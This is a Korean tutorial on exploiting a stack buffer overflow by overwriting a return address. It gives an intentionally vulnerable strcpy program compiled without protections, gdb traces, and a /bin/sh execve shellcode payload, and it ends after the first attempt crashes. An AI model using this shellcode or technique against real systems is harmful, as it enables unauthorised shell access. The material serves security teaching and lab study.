# Return Address Overwrite
* RET Overwrite Exploitation : 리턴 주소를 덮어 실행 흐름을 조작해 공격자가 원하는 코드를 실행하는 방법
``` C
//example1.c
// gcc -o example1 example1.c -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int vuln(char *src) {
  
  char buf[32] = {};
  
  strcpy(buf, src);
  return 0;
}
int main(int argc, char *argv[], char *environ[]) {
  if (argc < 2){
    exit(-1);
  }
  vuln(argv[1]);
  return 0;
}
```
example1.c에서는 프로그램의 argv[1]을 vuln 함수의 인자로 전달한다.   
vuln 함수에서는 src 버퍼를 buf 버퍼에 strcpy 함수를 이용해 복사한다.
strcpy 함수는 피복사 버퍼에 대한 길이 검증이 없이 때문에, 프로그램의 첫 번째 인자에 buf 배열의 크기보다 긴 문자열을 넣으면
스택 버퍼 오버플로우가 발생한다.
vuln함수의 메모리 구조는 아래와 같다.   
![image](https://user-images.githubusercontent.com/59531805/79189586-13f36d00-7e5d-11ea-89e2-2159296ec38a.png)

```
(gdb) p vuln
$1 = {<text variable, no debug info>} 0x804843b <vuln>
(gdb) b*0x804843b
Breakpoint 1 at 0x804843b
(gdb) r aaaabbbbccccdddd
Starting program: ~/example1 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
Breakpoint 1, 0x0804843b in vuln ()
(gdb) x/2wx $esp
0xffffd520:	0x08048494	0xffffd74a
(gdb) x/i 0x08048494
   0x8048494 <main+30>:	add    $0x4,%esp
(gdb) x/s 0xffffd74a
0xffffd74a:	"aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll"
(gdb) 
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804843b <+0>:	push   ebp
   0x0804843c <+1>:	mov    ebp,esp
   0x0804843e <+3>:	sub    esp,0x20
   0x08048441 <+6>:	mov    ecx,0x0
   0x08048446 <+11>:	mov    eax,0x20
   0x0804844b <+16>:	and    eax,0xfffffffc
   0x0804844e <+19>:	mov    edx,eax
   0x08048450 <+21>:	mov    eax,0x0
   0x08048455 <+26>:	mov    DWORD PTR [ebp+eax*1-0x20],ecx
   0x08048459 <+30>:	add    eax,0x4
   0x0804845c <+33>:	cmp    eax,edx
   0x0804845e <+35>:	jb     0x8048455 <vuln+26>
   0x08048460 <+37>:	push   DWORD PTR [ebp+0x8]
   0x08048463 <+40>:	lea    eax,[ebp-0x20]
   0x08048466 <+43>:	push   eax
   0x08048467 <+44>:	call   0x8048300 <strcpy@plt>
   0x0804846c <+49>:	add    esp,0x8
   0x0804846f <+52>:	mov    eax,0x0
   0x08048474 <+57>:	leave  
   0x08048475 <+58>:	ret  
End of assembler dump.
(gdb) 
```
breakpoint에서의 스택 메모리를 보면, 첫 4바이트는 vuln 함수의 리턴 주소이고 다음 4바이트는 vuln 함수의 인자인 argv[1]의 주소임을 알 수 있다.
strcpy 함수가 실행되기 직전에 breakpoint를 설정해 인자들을 살펴보자. 스택을 살펴보면 첫 번째 인자인 buf 주소와 두 번째 인자인 argv[1]의 주소가 저장되장되어 있는 것을 볼 수 있다.
```
(gdb) x/20i vuln
=> 0x804843b <vuln>:	push   ebp
   ...
   0x8048467 <vuln+44>:	call   0x8048300 <strcpy@plt>
   ...
(gdb) b *0x8048467
Breakpoint 2 at 0x8048467
(gdb) c
Continuing.
Breakpoint 2, 0x08048467 in vuln ()
(gdb) x/2wx $esp
0xffffd4f4:	0xffffd4fc	0xffffd74a
```
strcpy 함수를 실행해보자. strcpy 함수의 첫 번째 인자인 buf(0xffffd4fc)에 argv[1]의 문자열이 복사된 것을 볼 수 있다.
argv[1]에 buf의 길이인 32바이트보다 긴 문자열을 주었기 때문에 vuln의 리턴주소가 저장된 0xffffd520(buf[32]+SFP[4]+RET[4])너머까지
argv[1] 문자열이 복사된 것을 확인할 수 있다.
```
(gdb) ni
0x0804846c in vuln ()
(gdb) x/20wx 0xffffd4fc
0xffffd4fc:	0x61616161	0x62626262	0x63636363	0x64646464
0xffffd50c:	0x65656565	0x66666666	0x67676767	0x68686868
0xffffd51c:	0x69696969	0x6a6a6a6a	0x6b6b6b6b	0x6c6c6c6c
0xffffd52c:	0xf7e1b600	0x00000002	0xffffd5c4	0xffffd5d0
0xffffd53c:	0x00000000	0x00000000	0x00000000	0xf7fb5000
(gdb) 
```
위와 같이 실행이 되면 RET가 0x6a6a6a6a로 바뀌었다.
공격자가 /bin/sh/ 혹은 셸 바이너리를 실행하는 기계어 코드를 실행한다면, 셸에서 제공하는 여러 명령어들을 실행할 수 있다.
리눅스에서는 바이너리를 실행시키기 위해서 execve 시스템 콜을 사용한다.
```
execve syscall
syscall number(eax register) - 0xb(11)
1st argument(ebx register) – pathname
2nd argument(ecx register) – argv[]
3rd argument(edx register) – envp[]
```
pathname에는 실행시킬 바이너리의 경로, argv는 프로그램의 인자 포인터 배열, envp에는 프로그램의 환경 변수 포인터 배열이 요구된다.
단순히 /bin/sh 바이너리를 실행시키는 것이 목적이기 떄무에 sys_execve("/bin/sh"주소, NULL, NULL) 형태의 execve 시스템 콜을 호출하면 된다.
리턴 주소가 저장된 스택 메모리를 덮기까지 남은 36바이트(buf[32]+SFP[4])의 위치에 셸코드를 위치시키고, 리턴 주소를 저장된 셸코드 주소로 바꾸는 공격 코드를 만들어보자.   
![image](https://user-images.githubusercontent.com/59531805/79190502-7483a980-7e5f-11ea-856e-4d06475a4a29.png)
셸코드의 길이는 23바이트이므로 공격코드는 다음과 같이 구성된다.
```
셸코드 + 임의의 13바이트 + 0xffffd4fc(strcpy 함수의 첫 번째 인자인 buf의 주소)
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "\x90”*13 + “\xfc\xd4\xff\xff”
```
```
$ ./example1 python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"+"A"*13+"\xfc\xd4\xff\xff"'
[1]    88636 segmentation fault (core dumped)  ./example1 
$ 
```
셸을 획득하지 못하고 프로그램이 비정상 종료되었다. 스택의 셸코드의 주소가 실행을 하면서 바뀌었기 때문이다.
정확성을 높이기 위해 NOP을 사용해야 한다.


















































